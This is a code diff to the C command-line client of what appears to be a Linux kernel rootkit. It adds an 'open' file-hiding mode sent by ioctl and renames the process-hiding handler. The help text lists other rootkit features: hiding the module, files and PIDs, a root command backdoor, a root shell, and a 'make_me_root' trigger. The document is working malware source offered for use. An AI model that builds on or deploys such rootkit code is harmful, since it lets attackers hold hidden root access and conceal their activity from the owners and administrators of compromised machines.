@@ -48,16 +48,29 @@ parse_input(int argc, char **argv)
     }
 
     if (ARGVCMP(1, "filehide")) {
-        ASSERT_ARGC(2, "filehide <toggle | on | off>");
+        ASSERT_ARGC(2, "filehide [open] <toggle | on | off>");
 
-        if (ARGVCMP(2, "toggle"))
-            return (cmd_t){ handle_filehide, (void *)0 };
+        if (ARGVCMP(2, "open")) {
+            ASSERT_ARGC(3, "filehide [open] <toggle | on | off>");
 
-        if (ARGVCMP(2, "on"))
-            return (cmd_t){ handle_filehide, (void *)1 };
+            if (ARGVCMP(3, "toggle"))
+                return (cmd_t){ handle_openhide, (void *)0 };
 
-        if (ARGVCMP(2, "off"))
-            return (cmd_t){ handle_filehide, (void *)-1 };
+            if (ARGVCMP(3, "on"))
+                return (cmd_t){ handle_openhide, (void *)1 };
+
+            if (ARGVCMP(3, "off"))
+                return (cmd_t){ handle_openhide, (void *)-1 };
+        } else {
+            if (ARGVCMP(2, "toggle"))
+                return (cmd_t){ handle_filehide, (void *)0 };
+
+            if (ARGVCMP(2, "on"))
+                return (cmd_t){ handle_filehide, (void *)1 };
+
+            if (ARGVCMP(2, "off"))
+                return (cmd_t){ handle_filehide, (void *)-1 };
+        }
     }
 
     if (ARGVCMP(1, "backdoor")) {
@@ -87,10 +100,10 @@ parse_input(int argc, char **argv)
         long arg;
         if ((arg = strtol(argv[3], NULL, 10))) {
             if (ARGVCMP(2, "add"))
-                return (cmd_t){ handle_hidepid, (void *)(arg) };
+                return (cmd_t){ handle_pidhide, (void *)(arg) };
 
             if (ARGVCMP(2, "rm"))
-                return (cmd_t){ handle_hidepid, (void *)((-1) * (arg)) };
+                return (cmd_t){ handle_pidhide, (void *)((-1) * (arg)) };
         } else {
             fprintf(stderr, "%s: invalid pid `%s`\n", progname, argv[3]);
             exit(1);
@@ -98,7 +111,7 @@ parse_input(int argc, char **argv)
     }
 
     if (ARGVCMP(1, "hidepid-off"))
-            return (cmd_t){ handle_hidepid, (void *)0 };
+            return (cmd_t){ handle_pidhide, (void *)0 };
 
     help();
     exit(1);
@@ -120,6 +133,12 @@ int
 handle_filehide(void *arg)
 {
     return issue_ioctl(G7_FILEHIDE, (const char *)arg);
+}
+
+int
+handle_openhide(void *arg)
+{
+    return issue_ioctl(G7_OPENHIDE, (const char *)arg);
 }
 
 int
@@ -160,9 +179,9 @@ handle_togglebd(void *arg)
 }
 
 int
-handle_hidepid(void *arg)
+handle_pidhide(void *arg)
 {
-    return issue_ioctl(G7_HIDEPID, (const char *)arg);
+    return issue_ioctl(G7_PIDHIDE, (const char *)arg);
 }
 
 int
@@ -192,7 +211,7 @@ help()
     printf("%-32s %s\n", "ping", "send an echo request to the rootkit");
     printf("%-32s %s\n", "unload", "gracefully unload the rootkit module");
     printf("%-32s %s\n", "modhide <on | off>", "{,un}hide rootkit module");
-    printf("%-32s %s\n", "filehide <toggle | on | off>", "{,un}hide files");
+    printf("%-32s %s\n", "filehide [open] <toggle | on | off>", "{,un}hide [open] files");
     printf("%-32s %s\n", "backdoor <execve_command>", "exec a command as root");
     printf("%-32s %s\n", "shell", "obtain a shell as root");
     printf("%-32s %s\n", "backdoor-use-tty <0 | 1>", "listen for `make_me_root` on read (0) or tty (1)");
